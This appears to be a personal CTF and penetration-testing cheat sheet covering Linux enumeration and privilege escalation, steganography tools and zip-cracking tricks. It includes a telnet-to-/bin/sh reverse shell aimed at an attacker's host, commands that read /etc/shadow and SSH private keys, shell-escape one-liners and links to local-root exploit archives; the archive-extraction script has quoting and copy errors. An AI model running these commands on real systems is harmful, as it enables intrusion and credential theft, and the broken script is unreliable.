# Linux
## Basic Idea
1. Change dir to other user may find Interesting things.
2. check ~/ bash* file to check some interesting things.
3. go to /proc/<pid>/ to find something
    * maybe check cmdline to find what command is running & may find plaintext password
    * go to /proc/<PID>/ to list files and directories
    ``` 
    **Path worth to pay attention**
    cmdline – command line of the process
    environ – environmental variables
    fd – file descriptors
    limits – contains information about the limits of the process
    mounts – related information
    You will also notice a number of links in the numbered directory:
    cwd – a link to the current working directory of the process
    exe – link to the executable of the process
    root – link to the work directory of the process 
    ```
4. check /etc/passwd to find how many user in the host & other info like shell they used
## Linux Enumuration & Privilege Escalation
### Operating System
1. What's the distribution type? What version?
    * cat /etc/issue
    * cat /etc/*-release
    * cat /etc/lsb-release      # Debian based
    * cat /etc/redhat-release   # Redhat based
2. What's the kernel version? Is it 64-bit?
    * cat /proc/version
    * uname -a
    * uname -mrs
    * rpm -q kernel
    * dmesg | grep Linux
    * ls /boot | grep vmlinuz-

3. What can be learnt from the environmental variables?
    * cat /etc/profile
    * cat /etc/bashrc
    * cat ~/.bash_profile
    * cat ~/.bashrc
    * cat ~/.bash_logout
    * env
    * set
4. Is there a printer?
    * lpstat -a
    
### Applications & Services
1. What services are running? Which service has which user privilege?
    * ps aux
    * ps -ef
    * top
    * cat /etc/services
2. Which service(s) are been running by root? Of these services, which are vulnerable - it's worth a double check!
    * ps aux | grep root
    * ps -ef | grep root
3. What applications are installed? What version are they? Are they currently running?
    * ls -alh /usr/bin/
    * ls -alh /sbin/
    * dpkg -l
    * rpm -qa
    * ls -alh /var/cache/apt/archivesO
    * ls -alh /var/cache/yum/
4. Any of the service(s) settings misconfigured? Are any (vulnerable) plugins attached?
    * cat /etc/syslog.conf
    * cat /etc/chttp.conf
    * cat /etc/lighttpd.conf
    * cat /etc/cups/cupsd.conf
    * cat /etc/inetd.conf
    * cat /etc/apache2/apache2.conf
    * cat /etc/my.conf
    * cat /etc/httpd/conf/httpd.conf
    * cat /opt/lampp/etc/httpd.conf
    * ls -aRl /etc/ | awk '$1 ~ /^.*r.*/
5. What jobs are scheduled?
    * crontab -l
    * ls -alh /var/spool/cron
    * ls -al /etc/ | grep cron
    * ls -al /etc/cron*
    * cat /etc/cron*
    * cat /etc/at.allow
    * cat /etc/at.deny
    * cat /etc/cron.allow
    * cat /etc/cron.deny
    * cat /etc/crontab
    * cat /etc/anacrontab
    * cat /var/spool/cron/crontabs/root
6. Any plain text usernames and/or passwords?
    * grep -i user [filename]
    * grep -i pass [filename]
    * grep -C 5 "password" [filename]
    * find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"   # Joomla
    
### Communications & Networking
1. What NIC(s) does the system have? Is it connected to another network?
    * /sbin/ifconfig -a
    * cat /etc/network/interfaces
    * cat /etc/sysconfig/network
2. What are the network configuration settings? What can you find out about this network? DHCP server? DNS server? Gateway?
    * cat /etc/resolv.conf
    * cat /etc/sysconfig/network
    * cat /etc/networks
    * iptables -L
    * hostname
    * dnsdomainname
3. What other users & hosts are communicating with the system?
    * lsof -i
    * lsof -i :80
    * grep 80 /etc/services
    * netstat -antup
    * netstat -antpx
    * netstat -tulpn
    * chkconfig --list
    * chkconfig --list | grep 3:on
    * last
    * w
4. Whats cached? IP and/or MAC addresses
    * arp -e
    * route
    * /sbin/route -nee
5. Is packet sniffing possible? What can be seen? Listen to live traffic
    * tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21
    > Note: tcpdump tcp dst [ip] [port] and tcp dst [ip] [port]
     
6. Have you got a shell? Can you interact with the system?
    * nc -lvp 4444    # Attacker. Input (Commands)
    * nc -lvp 4445    # Attacker. Ouput (Results)
    * telnet [atackers ip] 44444 | /bin/sh | [local ip] 44445    # On the targets system. Use the attackers IP!
    > Note: http://lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/
 
7. Is port forwarding possible? Redirect and interact with traffic from another view
    > Note: http://www.boutell.com/rinetd/
    > Note: http://www.howtoforge.com/port-forwarding-with-rinetd-on-debian-etch
    > Note: http://downloadcenter.mcafee.com/products/tools/foundstone/fpipe2_1.zip
     
    * Note: FPipe.exe -l [local port] -r [remote port] -s [local port] [local IP]
        * FPipe.exe -l 80 -r 80 -s 80 192.168.1.7

    * Note: ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip]
        * ssh -L 8080:127.0.0.1:80 root@192.168.1.7    # Local Port
        * ssh -R 8080:127.0.0.1:80 root@192.168.1.7    # Remote Port

    * Note: mknod backpipe p ; nc -l -p [remote port] < backpipe | nc [local IP] [local port] >backpipe
        * mknod backpipe p ; nc -l -p 8080 < backpipe | nc 10.5.5.151 80 >backpipe    # Port Relay
        * mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1>backpipe ->  Proxy (Port 80 to 8080)
        * mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow & 1>backpipe -> Proxy monitor (Port 80 to 8080)

8. Is tunnelling possible? Send commands locally, remotely
    * ssh -D 127.0.0.1:9050 -N [username]@[ip]
    * proxychains ifconfig

### Confidential Information & Users
1. Who are you? Who is logged in? Who has been logged in? Who else is there? Who can do what?
    * id
    * who
    * w
    * last
    * cat /etc/passwd | cut -d: -f1    # List of users
    * grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'   # List of super users
    * awk -F: '($3 == "0") {print}' /etc/passwd   # List of super users
    * cat /etc/sudoers
    * sudo -l
2. What sensitive files can be found?
    * cat /etc/passwd
    * cat /etc/group
    * cat /etc/shadow
    * ls -alh /var/mail/
3. Anything "interesting" in the home directorie(s)? If it's possible to access
    * ls -ahlR /root/
    * ls -ahlR /home/
4. Are there any passwords in; scripts, databases, configuration files or log files? Default paths and locations for passwords
    * cat /var/apache2/config.inc
    * cat /var/lib/mysql/mysql/user.MYD
    * cat /root/anaconda-ks.cfg
5. What has the user being doing? Is there any password in plain text? What have they been edting?
    * cat ~/.bash_history
    * cat ~/.nano_history
    * cat ~/.atftp_history
    * cat ~/.mysql_history
    * cat ~/.php_history
6. What user information can be found?
    * cat ~/.bashrc
    * cat ~/.profile
    * cat /var/mail/root
    * cat /var/spool/mail/root
7. Can private-key information be found?
    * cat ~/.ssh/authorized_keys
    * cat ~/.ssh/identity.pub
    * cat ~/.ssh/identity
    * cat ~/.ssh/id_rsa.pub
    * cat ~/.ssh/id_rsa
    * cat ~/.ssh/id_dsa.pub
    * cat ~/.ssh/id_dsa
    * cat /etc/ssh/ssh_config
    * cat /etc/ssh/sshd_config
    * cat /etc/ssh/ssh_host_dsa_key.pub
    * cat /etc/ssh/ssh_host_dsa_key
    * cat /etc/ssh/ssh_host_rsa_key.pub
    * cat /etc/ssh/ssh_host_rsa_key
    * cat /etc/ssh/ssh_host_key.pub
    * cat /etc/ssh/ssh_host_key

### File Systems
1. Which configuration files can be written in /etc/? Able to reconfigure a service?
    * ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null     # Anyone
    * ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null       # Owner
    * ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null    # Group
    * ls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null        # Other
    * find /etc/ -readable -type f 2>/dev/null               # Anyone
    * find /etc/ -readable -type f -maxdepth 1 2>/dev/null   # Anyone
2. What can be found in /var/ ?
    * ls -alh /var/log
    * ls -alh /var/mail
    * ls -alh /var/spool
    * ls -alh /var/spool/lpd
    * ls -alh /var/lib/pgsql
    * ls -alh /var/lib/mysql
    * cat /var/lib/dhcp3/dhclient.leases
3. Any settings/files (hidden) on website? Any settings file with database information?
    * ls -alhR /var/www/
    * ls -alhR /srv/www/htdocs/
    * ls -alhR /usr/local/www/apache22/data/
    * ls -alhR /opt/lampp/htdocs/
    * ls -alhR /var/www/html/
4. Is there anything in the log file(s) (Could help with "Local File Includes"!)
    * cat /etc/httpd/logs/access_log
    * cat /etc/httpd/logs/access.log
    * cat /etc/httpd/logs/error_log
    * cat /etc/httpd/logs/error.log
    * cat /var/log/apache2/access_log
    * cat /var/log/apache2/access.log
    * cat /var/log/apache2/error_log
    * cat /var/log/apache2/error.log
    * cat /var/log/apache/access_log
    * cat /var/log/apache/access.log
    * cat /var/log/auth.log
    * cat /var/log/chttp.log
    * cat /var/log/cups/error_log
    * cat /var/log/dpkg.log
    * cat /var/log/faillog
    * cat /var/log/httpd/access_log
    * cat /var/log/httpd/access.log
    * cat /var/log/httpd/error_log
    * cat /var/log/httpd/error.log
    * cat /var/log/lastlog
    * cat /var/log/lighttpd/access.log
    * cat /var/log/lighttpd/error.log
    * cat /var/log/lighttpd/lighttpd.access.log
    * cat /var/log/lighttpd/lighttpd.error.log
    * cat /var/log/messages
    * cat /var/log/secure
    * cat /var/log/syslog
    * cat /var/log/wtmp
    * cat /var/log/xferlog
    * cat /var/log/yum.log
    * cat /var/run/utmp
    * cat /var/webmin/miniserv.log
    * cat /var/www/logs/access_log
    * cat /var/www/logs/access.log
    * ls -alh /var/lib/dhcp3/
    * ls -alh /var/log/postgresql/
    * ls -alh /var/log/proftpd/
    * ls -alh /var/log/samba/
     
    > Note: auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp
    > Note: http://www.thegeekstuff.com/2011/08/linux-var-log-files/
    
5. If commands are limited, you break out of the "jail" shell?
    * python -c 'import pty;pty.spawn("/bin/bash")'
    * echo os.system('/bin/bash')
    * /bin/sh -i
    
6. How are file-systems mounted?
    * mount
    * df -h

7. Are there any unmounted file-systems?
    * cat /etc/fstab

8. What "Advanced Linux File Permissions" are used? Sticky bits, SUID & GUID
```shell
find / -perm -1000 -type d 2>/dev/null   # Sticky bit -> Only the owner of the directory or the owner of a file can delete or rename here.
find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) -> run as the group, not the user who started it.
find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) -> run as the owner, not the user who started it.
find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    # Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)
# find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
```
9. Where can written to and executed from? A few 'common' places: /tmp, /var/tmp, /dev/shm
    * find / -writable -type d 2>/dev/null      # world-writeable folders
    * find / -perm -222 -type d 2>/dev/null     # world-writeable folders
    * find / -perm -o w -type d 2>/dev/null     # world-writeable folders
    * find / -perm -o x -type d 2>/dev/null     # world-executable folders
    * find / \( -perm -o w -perm -o x \) -type d 2>/dev/null   # world-writeable & executable folders

10. Any "problem" files? Word-writeable, "nobody" files
    * find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # world-writeable files
    * find /dir -xdev \( -nouser -o -nogroup \) -print   # Noowner files

### Preparation & Finding Exploit Code
1. What development tools/languages are installed/supported?
    * find / -name perl*
    * find / -name python*
    * find / -name gcc*
    * find / -name cc
2. How can files be uploaded?
    * find / -name wget
    * find / -name nc*
    * find / -name netcat*
    * find / -name tftp*
    * find / -name ftp

### Exploit Resource
1. Website to find exploit
    * [http://www.exploit-db.com](http://www.exploit-db.com) -> exploit database
    * [http://1337day.com](http://1337day.com) -> Could find some useful software in here.
    * [http://www.securiteam.com](http://www.securiteam.com)
    * [http://www.securityfocus.com](http://www.securityfocus.com)
    * [http://www.exploitsearch.net](http://www.exploitsearch.net)
    * [http://metasploit.com/modules/](http://metasploit.com/modules/)
    * [http://securityreason.com](http://securityreason.com)
    * [http://seclists.org/fulldisclosure/](http://seclists.org/fulldisclosure/)
    * [http://www.google.com](http://www.google.com)
2. Website to find related info about exploit
    * http://www.cvedetails.com
    * http://packetstormsecurity.org/files/cve/[CVE]
    * http://cve.mitre.org/cgi-bin/cvename.cgi?name=[CVE]
    * http://www.vulnview.com/cve-details.php?cvename=[CVE]
3. Pre-complied archive
    * http://web.archive.org/web/20111118031158/http://tarantula.by.ru/localroot/
    * http://www.kecepatan.66ghz.com/file/local-root-exploit-priv9/
## Reference
### Tools & git repo
* [grep - search pattern](https://caspar.bgsu.edu/~courses/Stats/Labs/Handouts/grepsearch.htm)
* [jq](https://stedolan.github.io/jq/): a command line json processor(see hackthebox - Luke).
* [LinEnum](h:f:Jttps://github.com/rebootuser/LinEnum): a basic linux Enum tool, used by john hammond.
* [linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration): other Enum tools inspired by LinEnum.
* [PEASS - Privilege Escalation Awesome Scripts SUITE](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite): privilege escalation tools for Windows and Linux/Unix.
### Articles 
* [Exploring /proc File System in Linux](https://www.tecmint.com/exploring-proc-file-system-in-linux/)
* [Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)

# Windows



# Steganography
## Basic idea
    Using [stego-toolkits](https://github.com/DominicBreuker/stego-toolkit): A docker images contain a lot of steganography tools.
    
    1. Check file type.
    2. Strings -a file to list printable chars.(may find hints, binary string or base64 string)
    3. try exiftool to extract header info.
    4. try pngcheck/PCRT to check the png file and repair.
    5. if there are no files embeded in the image or audit.
        1. try stegsolv/steghide to find hidden info
        2. try hexeditor to change the wight/height of the image
        3. try LSB solver
    6. if there are files embeded in the image.
        1. try binwalk/foremost to extract file.
        2. if images, try step. 3
    7. try Nice Color(info hiden in the pixel value) see the [CTF Tidbits: Part 1 — Steganography](https://medium.com/@FourOctets/ctf-tidbits-part-1-steganography-ea76cc526b40)

## Least Significant Bit (LSB)
* One pixel contain 3 channels and 1 Byte per channel(0 - 255)
* ![](https://www.boiteaklou.fr/assets/2018-08-12/byte_diagram.jpg)
* The first bit on the left is the “heaviest” one since it’s the one that has the biggest influence on the value of the byte. Its weight is 128.
* look at the bit on the very right. Its weight is 1 and it has a very minor impact on the value of the byte. In a way, this bit is the least significant bit of this byte. **Basically, unvisable!!!**
* we can modify **3 bits per pixel(one bit per channel)** without it is noticeable.
* **NOTE:** Make sure to hide your message inside a PNG file and not a JPEG or its lossy compression algorithm will overwrite your modifications!
* we could use the zsteg to extract hide message.

## Tools
* **file:** The file command determines the file type of a file. It reports the file type in human readable format (e.g. 'ASCII text') or MIME type (e.g. 'text/plain; charset=us-ascii'). As filenames in UNIX can be entirely independent of file type file can be a useful command to determine how to view or work with a file.
* **Strings:** finds and prints text strings embedded in all files strings filename. e.g. ``strings filename | awk 'length($0)>15' | sort -u``
* **Hexeditor:** A hex editor, also called a binary file editor or byteeditor, is a type of program that allows a user to view and edit the raw and exact contents of files, that is, at the byte level. **Change image size!!!!!!**
* **binwalk:** Binwalk is a fast, easy to use tool for analyzing, reverse engineering, and extracting firmware images. Binwalk is a great tool for extracting hidden files from other files as well.
* **xxd:** is a Linux command that creates a hex dump of a given file or standard input. It can also convert a hex dump back to its original binary form. Like uuencode(1) and uudecode(1) it allows the transmission of binary data in a “mail-safe” ASCII representation, but has the advantage of decoding to standard output.
* **stegsolv:** A great GUI tool that covers a wide range of analysis, some of which is covered by the other tools mentioned above and a lot more including color profiles, planes, Color maps, strings.
* **Sonic visualizer:** Sonic Visualizer is a great tool to find hidden messages in audio files and a great way to work with audio files in general.
* **pngcheck:** Check for any corruption or anomalous sections pngcheck -v PNGs can contain a variety of data ‘chunks’ that are optional (non-critical) as far as rendering is concerned.
* **PCRT (PNG Check & Repair Tool)**: PCRT (PNG Check & Repair Tool) is a tool to help check if PNG image correct and try to auto fix the error. It's cross-platform, which can run on Windows, Linux and Mac OS.
* **exiftool:** Check out metadata of media files.
* **zsteg:** Detect stegano-hidden data in PNG & BMP, which could be used to solve **LSB** hide.
* **Imagemagick:** A comprehensive tool to manipulate images. **Split GIF files!!!** [ICECTF-John Hammond](https://medium.com/@johnhammond010/icectf-2018-writeups-32df8e53facd)
    * `convert foo.git %02d.png`
    * `ls *.png | while read filename; while do covert $filename -transparent white $filename; done` 
    * `ls *.png |while read line; do convert 00000.png $line -gravity center -composite 00000.png; done`
* **pngcsum:** A tool to fix png check sum.

## Reference
* [Steganography Tutorial: Least Significant Bit (LSB)](https://www.boiteaklou.fr/Steganography-Least-Significant-Bit.html)
* [CTF Tidbits: Part 1 — Steganography](https://medium.com/@FourOctets/ctf-tidbits-part-1-steganography-ea76cc526b40)
* [File signature List](https://www.garykessler.net/library/file_sigs.html)
* [Imagemagick](http://imagemagick.org/script/convert.php)

# About Zip/Tar/7z/bzip file

    Useful_Tools: unzip/bunzip2/gunzip/7z
    
    ls * | grep "Pattern" | while read line; do tar xf $line; done
    grep -v "Pattern" -> find something exclude <Pattern>
    ls |  grep "Pattern" | grep -v "Pattern" | while read line; do diff -f comp_1 $line; done -> recursive compare files[Juniors CTF 2016](https://www.youtube.com/watch?v=32JO9Tsj_ZI) -> using diff to compare 2 files.

## Some Ideas 

    1. Strings zip
    2. Bruteforce - create dictionary(crunch/python)
    3. fake encryption - change flag to 00
    4. dictionary attack
    5. plaintext attack - using ARCHPR
    6. crc32 collision - check reference below
    7. fix zip header - sometimes the zip header will be modified. we should fix it first
        * [RADARCTF2019-Misc(+Programming) Writeup](https://medium.com/hackstreetboys/radarctf2019-misc-programming-writeup-7201fbf4d7c29)

## rabbit hole script 
[MITRE CTF 2019 - JOURNEY TO THE CENTER OF THE FILE](https://www.youtube.com/watch?v=wRSwagjvSqU):  ZIP Archive Matryoshka Doll
```shell
#!/bin/bash

filename=$1

rm -r tmp
mkdir tmp
cp tmp $filename tmp

cd tmp

while [ 1 ]
do
    file $filename
    
    file $filename | grep "bzip2"
    if [[ "${?} -eq "0" ]]
    then
        echo "This is a Bzip!"
        mv $filename $filename.bz2
        bunzip2 $filename.bz2
        filename=$(ls *)
    fi
    
    file $filename | grep "Zip"
    if [[ "${?} -eq "0" ]]
    then
        echo "This is a Zip!"
        mv $filename $filename.zip
        unzip $filename.zip
        rm $filename.zip
        filename=$(ls *)
    fi
    
    file $filename | grep "ASCII"
    if [[ "${?} -eq "0" ]]
    then
        echo "This is a ASCII!"
        tail -c 100 $filename
        base64 -d $filename > $filename.new
        rm $filename
        filename=$(ls *)
    fi
    
    file $filename | grep "init="
    if [[ "${?} -eq "0" ]]
    then
        echo "This is a base64!"
        base64 -d $filename > $filename.new
        rm $filename
        filename=$(ls *)
    fi
    
    file $filename | grep "gzip"
    if [[ "${?} -eq "0" ]]
    then
        echo "This is a gzip!"
        mv $filename $filename.gz
        gunzip $filename.gz
        filename=$(ls *)
    fi
done
```
## Tools
* **fcrackzip:** A tool to crack the zip file.[offical website](http://oldhome.schmorp.de/marc/fcrackzip.html)
* **Archpr:** A tool to attack zip, including plaintext attack 
 
## Reference
* [CTF_zip_Tricks](https://www.anquanke.com/post/id/86211)
